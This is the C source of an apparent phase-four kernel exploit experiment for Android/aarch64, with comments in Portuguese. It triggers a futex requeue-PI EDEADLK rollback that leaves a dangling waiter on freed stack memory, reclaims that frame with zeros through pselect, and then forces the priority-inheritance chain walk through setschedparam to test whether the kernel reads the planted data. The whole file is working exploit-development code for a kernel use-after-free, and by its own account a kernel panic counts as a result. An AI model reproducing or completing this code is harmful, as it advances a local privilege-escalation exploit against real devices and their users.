/*
 * ghostlock_reclaim_try.c — Fase 4: reclaim controlada, 1 shot por boot.
 *
 * Pergunta binaria: o frame liberado do waiter e reocupavel com dados
 * nossos, e o chain walk consome esses valores?
 *
 * Desenho (1 target descartavel, 1 padrao conhecido):
 *  - trio waiter/owner + CMP_REQUEUE_PI -> EDEADLK (rollback, dangling).
 *  - teardown limpo; waiter volta ao userspace (frame livre) e IMEDIATO
 *    carimba a propria stack com pselect(nfds=1024, 3x fd_set zerado):
 *    ~384-768B de zeros na profundidade de syscall, sem efeito colateral
 *    (timeout 0, retorno imediato).
 *  - waiter depois gira em spin userspace SEM syscall (sleep chamaria
 *    nanosleep e reusaria a stack por cima do carimbo).
 *  - consumer minimo (setschedparam BATCH/OTHER, o mesmo que deu 60s no
 *    baseline) no waiter vivo.
 *
 * Baseline Fase 3 sem carimbo: consumer 60s stall ret 0 (walk seguiu o
 * waiter estagnado). Com zeros no frame:
 *  - POSITIVO: desvio nitido (erro rapido, stall diferente, ou panic) =
 *    walk leu lock=NULL/task=NULL nosso. Panic aqui e dado, nao falha.
 *  - NEGATIVO: 60s ret 0 identico = reclaim errou o slot ou walk nao tocou.
 *
 * Sem cred, SELinux, funcptr, shellcode, persistencia. Uma execucao.
 *
 * Build: aarch64-linux-android28-clang -O2 -Wall -static
 *   ghostlock_reclaim_try.c -o ghostlock_reclaim_try
 */
#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/select.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#ifndef __NR_futex
#define __NR_futex 98
#endif
#ifndef FUTEX_LOCK_PI
#define FUTEX_LOCK_PI 6
#define FUTEX_UNLOCK_PI 7
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI 12
#define FUTEX_PRIVATE_FLAG 128
#endif
#ifndef EDEADLK
#define EDEADLK 35
#endif

#define FLPI (FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG)
#define FUPI (FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG)
#define FWRQ (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define FCRQ (FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG)

static uint32_t f_wait, f_target, f_chain;
static volatile int w_ready, w_waiting, w_done, o_started;

static long xfutex(void *u1, int op, uint32_t val, void *to, void *u2,
                   uint32_t v3) {
    return syscall(__NR_futex, u1, op, val, to, u2, v3);
}

static uint64_t now_ns(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

/* carimbo: zeros profundos na stack desta thread, sem efeito colateral */
static void stamp(void) {
    fd_set z;
    FD_ZERO(&z);
    struct timespec ts = { 0, 0 };
    pselect(1024, &z, &z, &z, &ts, NULL);
}

static void *waiter_fn(void *u) {
    (void)u;
    if (xfutex(&f_chain, FLPI, 0, NULL, NULL, 0))
        return NULL;
    w_ready = 1;
    while (!o_started)
        usleep(1000);
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 1;
    w_waiting = 1;
    xfutex(&f_wait, FWRQ, 0, &ts, &f_target, 0);
    xfutex(&f_chain, FUPI, 0, NULL, NULL, 0);
    w_done = 1;
    stamp(); /* frame livre agora; reocupa com zeros */
    /* spin sem syscall: preserva o carimbo ate o processo morrer */
    while (1) {
        __asm__ volatile("" ::: "memory");
    }
    return NULL;
}

static void *owner_fn(void *u) {
    (void)u;
    if (xfutex(&f_target, FLPI, 0, NULL, NULL, 0))
        return NULL;
    while (!w_ready)
        usleep(1000);
    o_started = 1;
    xfutex(&f_chain, FLPI, 0, NULL, NULL, 0);
    return NULL;
}

int main(void) {
    setbuf(stdout, NULL); /* panic mata buffer libc: sem flush, sem evidencia */
    printf("[info] reclaim try: zeros via pselect + consumer, 1 shot\n");
    f_wait = f_target = f_chain = 0;
    w_ready = w_waiting = w_done = o_started = 0;

    pthread_t w, o;
    pthread_create(&w, NULL, waiter_fn, NULL);
    pthread_create(&o, NULL, owner_fn, NULL);
    while (!w_waiting || !o_started)
        usleep(1000);
    usleep(200000);
    errno = 0;
    xfutex(&f_wait, FCRQ, 1, (void *)(uintptr_t)1, &f_target, 0);
    int cmpe = errno;
    printf("[reclaim] cmp_errno=%d (%s)\n", cmpe, strerror(cmpe));
    if (cmpe != EDEADLK) {
        printf("[verdict] NEGATIVO-setup: sem EDEADLK, sem dangling\n");
        return 3;
    }
    xfutex(&f_target, FUPI, 0, NULL, NULL, 0);
    pthread_join(o, NULL);
    int spins = 0;
    while (!w_done && spins++ < 150)
        usleep(20000);
    if (!w_done) {
        printf("[verdict] ABORT: waiter nao voltou\n");
        return 2;
    }
    /* waiter carimbou e gira em spin; consumer no estado corrompido */
    struct sched_param p = { .sched_priority = 0 };
    uint64_t t0 = now_ns();
    errno = 0;
    int r1 = pthread_setschedparam(w, SCHED_BATCH, &p);
    int e1 = errno;
    uint64_t t1 = now_ns();
    errno = 0;
    int r2 = pthread_setschedparam(w, SCHED_OTHER, &p);
    int e2 = errno;
    uint64_t t2 = now_ns();
    printf("[reclaim] batch ret=%d errno=%d(%s) %lluns | other ret=%d errno=%d(%s) %lluns\n",
           r1, e1, r1 ? strerror(e1) : "ok",
           (unsigned long long)(t1 - t0), r2, e2,
           r2 ? strerror(e2) : "ok", (unsigned long long)(t2 - t1));
    printf("[verdict] baseline era 60s/ret0: desvio nitido=POSITIVO, igual=NEGATIVO\n");
    pthread_detach(w);
    return 0;
}
